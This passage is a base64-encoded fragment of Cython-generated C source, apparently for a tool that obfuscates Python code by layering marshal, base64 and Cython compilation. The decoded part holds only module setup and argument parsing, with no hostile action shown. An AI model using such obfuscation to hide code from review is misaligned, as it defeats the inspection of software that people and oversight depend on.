19weXhfbW9kdWxlZGVmKSkpXG5cbiNkZWZpbmUgX19weXhfbSAoX19QeXhfU3RhdGVfRmluZE1vZHVsZSgmX19weXhfbW9kdWxlZGVmKSlcbiNlbHNlXG5zdGF0aWMgX19weXhfbXN0YXRldHlwZSBfX3B5eF9tc3RhdGVfZ2xvYmFsX3N0YXRpYyA9XG4jaWZkZWYgX19jcGx1c3BsdXNcbiAgICB7fTtcbiNlbHNlXG4gICAgezB9O1xuI2VuZGlmXG5zdGF0aWMgX19weXhfbXN0YXRldHlwZSAqIGNvbnN0IF9fcHl4X21zdGF0ZV9nbG9iYWwgPSAmX19weXhfbXN0YXRlX2dsb2JhbF9zdGF0aWM7XG4jZW5kaWZcblxuI2RlZmluZSBfX3B5eF9rcF91XyBfX3B5eF9zdHJpbmdfdGFiWzBdXG4jZGVmaW5lIF9fcHl4X2twX3VfMG0gX19weXhfc3RyaW5nX3RhYlsxXVxuI2RlZmluZSBfX3B5eF9rcF91XzFfOTJtXzM4XzVfNDhtQURESU5HX0NZVEhPTl9MQVkgX19weXhfc3RyaW5nX3RhYlsyXVxuI2RlZmluZSBfX3B5eF9rcF91XzFfOTJtXzM4XzVfNDltRU5DUllQVElORyBfX3B5eF9zdHJpbmdfdGFiWzNdXG4jZGVmaW5lIF9fcHl4X2twX3VfRmFpbGVkX2N5dGhvbl9lcnJvciBfX3B5eF9zdHJpbmdfdGFiWzRdXG4jZGVmaW5lIF9fcHl4X2twX3VfVEhJU19FTkNPREVfQllfUFJFRVRfQmVhc3RlcmVuMSBfX3B5eF9zdHJpbmdfdGFiWzVdXG4jZGVmaW5lIF9fcHl4X2twX3VfXzIgX19weXhfc3RyaW5nX3RhYls2XVxuI2RlZmluZSBfX3B5eF9rcF91X18zIF9fcHl4X3N0cmluZ190YWJbN11cbiNkZWZpbmUgX19weXhfa3BfdV9fNCBfX3B5eF9zdHJpbmdfdGFiWzhdXG4jZGVmaW5lIF9fcHl4X2twX3VfXzUgX19weXhfc3RyaW5nX3RhYls5XVxuI2RlZmluZSBfX3B5eF9uX3VfXzYgX19weXhfc3RyaW5nX3RhYlsxMF1cbiNkZWZpbmUgX19weXhfbl91X2FfMiBfX3B5eF9zdHJpbmdfdGFiWzExXVxuI2RlZmluZSBfX3B5eF9uX3VfYWEgX19weXhfc3RyaW5nX3RhYlsxMl1cbiNkZWZpbmUgX19weXhfbl91X2FzY2lpX2xvd2VyY2FzZSBfX3B5eF9zdHJpbmdfdGFiWzEzXVxuI2RlZmluZSBfX3B5eF9uX3VfYXNjaWlfdXBwZXJjYXNlIF9fcHl4X3N0cmluZ190YWJbMTRdXG4jZGVmaW5lIF9fcHl4X25fdV9hc3luY2lvX2Nvcm91dGluZXMgX19weXhfc3RyaW5nX3RhYlsxNV1cbiNkZWZpbmUgX19weXhfbl91X2F1dG9wZXA4IF9fcHl4X3N0cmluZ190YWJbMTZdXG4jZGVmaW5lIF9fcHl4X25fdV9iYXNlNjQgX19weXhfc3RyaW5nX3RhYlsxN11cbiNkZWZpbmUgX19weXhfa3BfdV9jIF9fcHl4X3N0cmluZ190YWJbMThdXG4jZGVmaW5lIF9fcHl4X25fdV9jaGFyYWN0ZXJzIF9fcHl4X3N0cmluZ190YWJbMTldXG4jZGVmaW5lIF9fcHl4X25fdV9jaG9pY2UgX19weXhfc3RyaW5nX3RhYlsyMF1cbiNkZWZpbmUgX19weXhfbl91X2NsYXNzX2dldGl0ZW0gX19weXhfc3RyaW5nX3RhYlsyMV1cbiNkZWZpbmUgX19weXhfbl91X2NsZWFyIF9fcHl4X3N0cmluZ190YWJbMjJdXG4jZGVmaW5lIF9fcHl4X25fdV9jbGluZV9pbl90cmFjZWJhY2sgX19weXhfc3RyaW5nX3RhYlsyM11cbiNkZWZpbmUgX19weXhfbl91X2Nsb3NlIF9fcHl4X3N0cmluZ190YWJbMjRdXG4jZGVmaW5lIF9fcHl4X25fdV9jb250ZW50IF9fcHl4X3N0cmluZ190YWJbMjVdXG4jZGVmaW5lIF9fcHl4X2twX3VfY3l0aG9uX20gX19weXhfc3RyaW5nX3RhYlsyNl1cbiNkZWZpbmUgX19weXhfbl91X2RhdGV0aW1lIF9fcHl4X3N0cmluZ190YWJbMjddXG4jZGVmaW5lIF9fcHl4X25fdV9kaWdpdHMgX19weXhfc3RyaW5nX3RhYlsyOF1cbiNkZWZpbmUgX19weXhfa3BfdV9kaXNhYmxlIF9fcHl4X3N0cmluZ190YWJbMjldXG4jZGVmaW5lIF9fcHl4X2twX3VfZW5hYmxlIF9fcHl4X3N0cmluZ190YWJbMzBdXG4jZGVmaW5lIF9fcHl4X25fdV9lbmNvZGluZyBfX3B5eF9zdHJpbmdfdGFiWzMxXVxuI2RlZmluZSBfX3B5eF9uX3VfZW50ZXIgX19weXhfc3RyaW5nX3RhYlszMl1cbiNkZWZpbmUgX19weXhfbl91X2V4aXQgX19weXhfc3RyaW5nX3RhYlszM11cbiNkZWZpbmUgX19weXhfbl91X2V4aXRfMiBfX3B5eF9zdHJpbmdfdGFiWzM0XVxuI2RlZmluZSBfX3B5eF9uX3VfZiBfX3B5eF9zdHJpbmdfdGFiWzM1XVxuI2RlZmluZSBfX3B5eF9uX3VfZml4X2NvZGUgX19weXhfc3RyaW5nX3RhYlszNl1cbiNkZWZpbmUgX19weXhfbl91X2Z1bmMgX19weXhfc3RyaW5nX3RhYlszN11cbiNkZWZpbmUgX19weXhfbl91X2cgX19weXhfc3RyaW5nX3RhYlszOF1cbiNkZWZpbmUgX19weXhfa3BfdV9nYyBfX3B5eF9zdHJpbmdfdGFiWzM5XVxuI2RlZmluZSBfX3B5eF9uX3VfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeCBfX3B5eF9zdHJpbmdfdGFiWzQwXVxuI2RlZmluZSBfX3B5eF9uX3VfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeF9sb2NhbHNfZ2UgX19weXhfc3RyaW5nX3RhYls0MV1cbiNkZWZpbmUgX19weXhfbl91X2dlbmV4cHIgX19weXhfc3RyaW5nX3RhYls0Ml1cbiNkZWZpbmUgX19weXhfbl91X2d3IF9fcHl4X3N0cmluZ190YWJbNDNdXG4jZGVmaW5lIF9fcHl4X25fdV9nd19sb2NhbHNfZ2VuZXhwciBfX3B5eF9zdHJpbmdfdGFiWzQ0XVxuI2RlZmluZSBfX3B5eF9uX3VfaSBfX3B5eF9zdHJpbmdfdGFiWzQ1XVxuI2RlZmluZSBfX3B5eF9uX3VfaW5fY29tbWVudCBfX3B5eF9zdHJpbmdfdGFiWzQ2XVxuI2RlZmluZSBfX3B5eF9uX3VfaW5pdGlhbGl6aW5nIF9fcHl4X3N0cmluZ190YWJbNDddXG4jZGVmaW5lIF9fcHl4X25fdV9pbnB1dF9mIF9fcHl4X3N0cmluZ190YWJbNDhdXG4jZGVmaW5lIF9fcHl4X25fdV9pbnB1dF9maWxlIF9fcHl4X3N0cmluZ190YWJbNDldXG4jZGVmaW5lIF9fcHl4X25fdV9pc19jb3JvdXRpbmUgX19weXhfc3RyaW5nX3RhYls1MF1cbiNkZWZpbmUgX19weXhfa3BfdV9pc2VuYWJsZWQgX19weXhfc3RyaW5nX3RhYls1MV1cbiNkZWZpbmUgX19weXhfbl91X2xlbmd0aCBfX3B5eF9zdHJpbmdfdGFiWzUyXVxuI2RlZmluZSBfX3B5eF9uX3VfbGV0dGVycyBfX3B5eF9zdHJpbmdfdGFiWzUzXVxuI2RlZmluZSBfX3B5eF9rcF91X20gX19weXhfc3RyaW5nX3RhYls1NF1cbiNkZWZpbmUgX19weXhfa3BfdV9tX25xX3B5IF9fcHl4X3N0cmluZ190YWJbNTVdXG4jZGVmaW5lIF9fcHl4X25fdV9tYWluIF9fcHl4X3N0cmluZ190YWJbNTZdXG4jZGVmaW5lIF9fcHl4X25fdV9tYXJzaGFsIF9fcHl4X3N0cmluZ190YWJbNTddXG4jZGVmaW5lIF9fcHl4X25fdV9tb2R1bGUgX19weXhfc3RyaW5nX3RhYls1OF1cbiNkZWZpbmUgX19weXhfbl91X25hbWUgX19weXhfc3RyaW5nX3RhYls1OV1cbiNkZWZpbmUgX19weXhfbl91X25hbWUyIF9fcHl4X3N0cmluZ190YWJbNjBdXG4jZGVmaW5lIF9fcHl4X25fdV9uYW1lMl9iYXNlIF9fcHl4X3N0cmluZ190YWJbNjFdXG4jZGVmaW5lIF9fcHl4X25fdV9uYW1lXzIgX19weXhfc3RyaW5nX3RhYls2Ml1cbiNkZWZpbmUgX19weXhfbl91X25leHQgX19weXhfc3RyaW5nX3RhYls2M11cbiNkZWZpbmUgX19weXhfbl91X25xIF9fcHl4X3N0cmluZ190YWJbNjRdXG4jZGVmaW5lIF9fcHl4X25fdV9vcGVuIF9fcHl4X3N0cmluZ190YWJbNjVdXG4jZGVmaW5lIF9fcHl4X25fdV9vcyBfX3B5eF9zdHJpbmdfdGFiWzY2XVxuI2RlZmluZSBfX3B5eF9uX3Vfb3V0cHV0X2NvbnRlbnQgX19weXhfc3RyaW5nX3RhYls2N11cbiNkZWZpbmUgX19weXhfbl91X291dHB1dF9mIF9fcHl4X3N0cmluZ190YWJbNjhdXG4jZGVmaW5lIF9fcHl4X25fdV9vdXRwdXRfZmlsZSBfX3B5eF9zdHJpbmdfdGFiWzY5XVxuI2RlZmluZSBfX3B5eF9uX3VfcG9wIF9fcHl4X3N0cmluZ190YWJbNzBdXG4jZGVmaW5lIF9fcHl4X25fdV9wcmludCBfX3B5eF9zdHJpbmdfdGFiWzcxXVxuI2RlZmluZSBfX3B5eF9rcF91X3B5IF9fcHl4X3N0cmluZ190YWJbNzJdXG4jZGVmaW5lIF9fcHl4X25fdV9xdWFsbmFtZSBfX3B5eF9zdHJpbmdfdGFiWzczXVxuI2RlZmluZSBfX3B5eF9uX3VfciBfX3B5eF9zdHJpbmdfdGFiWzc0XVxuI2RlZmluZSBfX3B5eF9uX3VfcmFuZGludCBfX3B5eF9zdHJpbmdfdGFiWzc1XVxuI2RlZmluZSBfX3B5eF9uX3VfcmFuZG9tIF9fcHl4X3N0cmluZ190YWJbNzZdXG4jZGVmaW5lIF9fcHl4X25fdV9yYW5nZSBfX3B5eF9zdHJpbmdfdGFiWzc3XVxuI2RlZmluZSBfX3B5eF9uX3VfcmVhZCBfX3B5eF9zdHJpbmdfdGFiWzc4XVxuI2RlZmluZSBfX3B5eF9uX3VfcmVtb3ZlIF9fcHl4X3N0cmluZ190YWJbNzldXG4jZGVmaW5lIF9fcHl4X25fdV9yZW1vdmVfY29tbWVudHMgX19weXhfc3RyaW5nX3RhYls4MF1cbiNkZWZpbmUgX19weXhfbl91X3JlcGxhY2UgX19weXhfc3RyaW5nX3RhYls4MV1cbiNkZWZpbmUgX19weXhfbl91X3NlbmQgX19weXhfc3RyaW5nX3RhYls4Ml1cbiNkZWZpbmUgX19weXhfbl91X3NldF9uYW1lIF9fcHl4X3N0cmluZ190YWJbODNdXG4jZGVmaW5lIF9fcHl4X25fdV9zaHV0aWwgX19weXhfc3RyaW5nX3RhYls4NF1cbiNkZWZpbmUgX19weXhfbl91X3NwZWMgX19weXhfc3RyaW5nX3RhYls4NV1cbiNkZWZpbmUgX19weXhfbl91X3N0cmluZyBfX3B5eF9zdHJpbmdfdGFiWzg2XVxuI2RlZmluZSBfX3B5eF9uX3Vfc3lzdGVtIF9fcHl4X3N0cmluZ190YWJbODddXG4jZGVmaW5lIF9fcHl4X25fdV90ZXN0IF9fcHl4X3N0cmluZ190YWJbODhdXG4jZGVmaW5lIF9fcHl4X25fdV90aHJvdyBfX3B5eF9zdHJpbmdfdGFiWzg5XVxuI2RlZmluZSBfX3B5eF9rcF91X3V0Zl84IF9fcHl4X3N0cmluZ190YWJbOTBdXG4jZGVmaW5lIF9fcHl4X25fdV92YWx1ZSBfX3B5eF9zdHJpbmdfdGFiWzkxXVxuI2RlZmluZSBfX3B5eF9uX3VfdyBfX3B5eF9zdHJpbmdfdGFiWzkyXVxuI2RlZmluZSBfX3B5eF9uX3Vfd3JpdGUgX19weXhfc3RyaW5nX3RhYls5M11cblxuI2lmIENZVEhPTl9VU0VfTU9EVUxFX1NUQVRFXG5zdGF0aWMgQ1lUSE9OX1NNQUxMX0NPREUgaW50IF9fcHl4X21fY2xlYXIoUHlPYmplY3QgKm0pIHtcbiAgX19weXhfbXN0YXRldHlwZSAqY2xlYXJfbW9kdWxlX3N0YXRlID0gX19QeXhfUHlNb2R1bGVfR2V0U3RhdGUobSk7XG4gIGlmICghY2xlYXJfbW9kdWxlX3N0YXRlKSByZXR1cm4gMDtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9kKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9iKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9jeXRob25fcnVudGltZSk7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfdHVwbGUpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X2J5dGVzKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV91bmljb2RlKTtcbiAgI2lmZGVmIF9fUHl4X0N5RnVuY3Rpb25fVVNFRFxuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X0N5RnVuY3Rpb25UeXBlKTtcbiAgI2VuZGlmXG4gICNpZmRlZiBfX1B5eF9GdXNlZEZ1bmN0aW9uX1VTRURcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9GdXNlZEZ1bmN0aW9uVHlwZSk7XG4gICNlbmRpZlxuICAjaWYgQ1lUSE9OX1BFUDQ4OV9NVUxUSV9QSEFTRV9JTklUXG4gIF9fUHl4X1N0YXRlX1JlbW92ZU1vZHVsZShOVUxMKTtcbiAgI2VuZGlmXG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIGZvciAoaW50IGk9MDsgaTw1OyArK2kpIHsgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF90dXBsZVtpXSk7IH1cbiAgZm9yIChpbnQgaT0wOyBpPDY7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2NvZGVvYmpfdGFiW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8OTQ7ICsraSkgeyBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X3N0cmluZ190YWJbaV0pOyB9XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzApO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xKTtcbiAgUHlfQ0xFQVIoY2xlYXJfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMik7XG4gIFB5X0NMRUFSKGNsZWFyX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzQpO1xuICBQeV9DTEVBUihjbGVhcl9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMCk7XG4gIHJldHVybiAwO1xufVxuI2VuZGlmXG5cbiNpZiBDWVRIT05fVVNFX01PRFVMRV9TVEFURVxuc3RhdGljIENZVEhPTl9TTUFMTF9DT0RFIGludCBfX3B5eF9tX3RyYXZlcnNlKFB5T2JqZWN0ICptLCB2aXNpdHByb2MgdmlzaXQsIHZvaWQgKmFyZykge1xuICBfX3B5eF9tc3RhdGV0eXBlICp0cmF2ZXJzZV9tb2R1bGVfc3RhdGUgPSBfX1B5eF9QeU1vZHVsZV9HZXRTdGF0ZShtKTtcbiAgaWYgKCF0cmF2ZXJzZV9tb2R1bGVfc3RhdGUpIHJldHVybiAwO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2QpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2IpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2N5dGhvbl9ydW50aW1lKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9lbXB0eV90dXBsZSk7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfZW1wdHlfYnl0ZXMpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2VtcHR5X3VuaWNvZGUpO1xuICAjaWZkZWYgX19QeXhfQ3lGdW5jdGlvbl9VU0VEXG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfQ3lGdW5jdGlvblR5cGUpO1xuICAjZW5kaWZcbiAgI2lmZGVmIF9fUHl4X0Z1c2VkRnVuY3Rpb25fVVNFRFxuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X0Z1c2VkRnVuY3Rpb25UeXBlKTtcbiAgI2VuZGlmXG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfcHR5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF9fZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0X19nZW5leHByKTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzFfZ3cpO1xuICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMm5xX19fcHl4X3Njb3BlX3N0cnVjdF8xX2d3KTtcbiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIFB5X1ZJU0lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8ybnFfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7XG4gIGZvciAoaW50IGk9MDsgaTw1OyArK2kpIHsgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90dXBsZVtpXSk7IH1cbiAgZm9yIChpbnQgaT0wOyBpPDY7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2NvZGVvYmpfdGFiW2ldKTsgfVxuICBmb3IgKGludCBpPTA7IGk8OTQ7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3N0cmluZ190YWJbaV0pOyB9XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzApO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xKTtcbiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMik7XG4gIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzQpO1xuICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMCk7XG4gIHJldHVybiAwO1xufVxuI2VuZGlmXG5cblxuXG5cblxuc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18ybnFfMWdlbmVyYXRlX3JhbmRvbV9zdWZmaXgoUHlPYmplY3QgKl9fcHl4X3NlbGYsIFxuI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMXG5QeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZWxzZVxuUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzXG4jZW5kaWZcbik7IFxuUHlEb2NfU1RSVkFSKF9fcHl4X2RvY18ybnFfZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeCwgIkdlbmVyYXRlIGEgcmFuZG9tIHN0cmluZyBvZiB1cHBlcmNhc2UgbGV0dGVycyBhbmQgZGlnaXRzLiIpO1xuc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMm5xXzFnZW5lcmF0ZV9yYW5kb21fc3VmZml4ID0geyJnZW5lcmF0ZV9yYW5kb21fc3VmZml4IiwgKFB5Q0Z1bmN0aW9uKSh2b2lkKCopKHZvaWQpKShfX1B5eF9QeUNGdW5jdGlvbl9GYXN0Q2FsbFdpdGhLZXl3b3JkcylfX3B5eF9wd18ybnFfMWdlbmVyYXRlX3JhbmRvbV9zdWZmaXgsIF9fUHl4X01FVEhfRkFTVENBTEx8TUVUSF9LRVlXT1JEUywgX19weXhfZG9jXzJucV9nZW5lcmF0ZV9yYW5kb21fc3VmZml4fTtcbnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMm5xXzFnZW5lcmF0ZV9yYW5kb21fc3VmZml4KFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBcbiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTFxuUHlPYmplY3QgKmNvbnN0ICpfX3B5eF9hcmdzLCBQeV9zc2l6ZV90IF9fcHl4X25hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2Vsc2VcblB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkc1xuI2VuZGlmXG4pIHtcbiAgUHlPYmplY3QgKl9fcHl4X3ZfbGVuZ3RoID0gMDtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7XG4gICNlbmRpZlxuICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7XG4gIFB5T2JqZWN0KiB2YWx1ZXNbMV0gPSB7MH07XG4gIGludCBfX3B5eF9saW5lbm8gPSAwO1xuICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7XG4gIGludCBfX3B5eF9jbGluZW5vID0gMDtcbiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwO1xuICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9uc1xuICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgiZ2VuZXJhdGVfcmFuZG9tX3N1ZmZpeCAod3JhcHBlcikiLCAwKTtcbiAgI2lmICFDWVRIT05fTUVUSF9GQVNUQ0FMTFxuICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkVcbiAgX19weXhfbmFyZ3MgPSBQeVR1cGxlX0dFVF9TSVpFKF9fcHl4X2FyZ3MpO1xuICAjZWxzZVxuICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMO1xuICAjZW5kaWZcbiAgI2VuZGlmXG4gIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpO1xuICB7XG4gICAgUHlPYmplY3QgKiogY29uc3QgX19weXhfcHlhcmduYW1lc1tdID0geyZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfbGVuZ3RoLDB9O1xuICAgIGNvbnN0IFB5X3NzaXplX3QgX19weXhfa3dkc19sZW4gPSAoX19weXhfa3dkcykgPyBfX1B5eF9OdW1Ld2FyZ3NfRkFTVENBTEwoX19weXhfa3dkcykgOiAwO1xuICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wzX2Vycm9yKVxuICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHtcbiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHtcbiAgICAgICAgY2FzZSAgMTpcbiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApO1xuICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgY2FzZSAgMDogYnJlYWs7XG4gICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7XG4gICAgICB9XG4gICAgICBjb25zdCBQeV9zc2l6ZV90IGt3ZF9wb3NfYXJncyA9IF9fcHl4X25hcmdzO1xuICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgImdlbmVyYXRlX3JhbmRvbV9zdWZmaXgiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmICghdmFsdWVzWzBdKSB2YWx1ZXNbMF0gPSBfX1B5eF9OZXdSZWYoKChQeU9iamVjdCAqKSgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCkpKTtcbiAgICB9IGVsc2Uge1xuICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykge1xuICAgICAgICBjYXNlICAxOlxuICAgICAgICB2YWx1ZXNbMF0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMCk7XG4gICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICBjYXNlICAwOiBicmVhaztcbiAgICAgICAgZGVmYXVsdDogZ290byBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjtcbiAgICAgIH1cbiAgICAgIGlmICghdmFsdWVzWzBdKSB2YWx1ZXNbMF0gPSBfX1B5eF9OZXdSZWYoKChQeU9iamVjdCAqKSgoUHlPYmplY3QqKV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8xMCkpKTtcbiAgICB9XG4gICAgX19weXhfdl9sZW5ndGggPSB2YWx1ZXNbMF07XG4gIH1cbiAgZ290byBfX3B5eF9MNl9za2lwO1xuICBfX3B5eF9MNV9hcmd0dXBsZV9lcnJvcjo7XG4gIF9fUHl4X1JhaXNlQXJndHVwbGVJbnZhbGlkKCJnZW5lcmF0ZV9yYW5kb21fc3VmZml4IiwgMCwgMCwgMSwgX19weXhfbmFyZ3MpOyBfX1BZWF9FUlIoMCwgMTMsIF9fcHl4X0wzX2Vycm9yKVxuICBfX3B5eF9MNl9za2lwOjtcbiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTtcbiAgX19weXhfTDNfZXJyb3I6O1xuICBmb3IgKFB5X3NzaXplX3QgX19weXhfdGVtcD0wOyBfX3B5eF90ZW1wIDwgKFB5X3NzaXplX3QpKHNpemVvZih2YWx1ZXMpL3NpemVvZih2YWx1ZXNbMF0pKTsgKytfX3B5eF90ZW1